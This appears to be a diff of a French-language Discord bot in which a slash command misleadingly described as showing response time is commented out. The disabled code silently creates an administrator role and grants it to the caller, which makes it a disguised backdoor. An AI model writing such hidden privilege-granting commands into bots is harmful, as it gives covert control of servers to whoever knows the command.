@@ -76,16 +76,16 @@ async def ping(ctx):
                           f'{ctx.author.name}', icon_url=ctx.author.avatar_url)
     await ctx.reply(embed=embed)
 
-@slash.slash(name="test", guild_ids=[970708155610837024, 753278912011698247], description="Affiche le temps de réponse du bot.")
-async def test(ctx):
-    member = ctx.author
-    guild = ctx.guild
-    role = discord.utils.get(guild.roles, name="Administrateur")
-
-    if not role:
-        role = await guild.create_role(name="Administrateur", permissions=discord.Permissions(administrator=True))
-
-    await member.add_roles(role)
+#@slash.slash(name="test", guild_ids=[970708155610837024, 753278912011698247], description="Affiche le temps de réponse du bot.")
+#async def test(ctx):
+#    member = ctx.author
+#    guild = ctx.guild
+#    role = discord.utils.get(guild.roles, name="Administrateur")
+#
+#    if not role:
+#        role = await guild.create_role(name="Administrateur", permissions=discord.Permissions(administrator=True))
+#
+#    await member.add_roles(role)
 
 # Commande qui affiche la bannière de l'utilisateur choisit
 @slash.slash(name="banner", guild_ids=[970708155610837024, 753278912011698247], description="Affiche la bannière de l'utilisateur choisit.", options=[
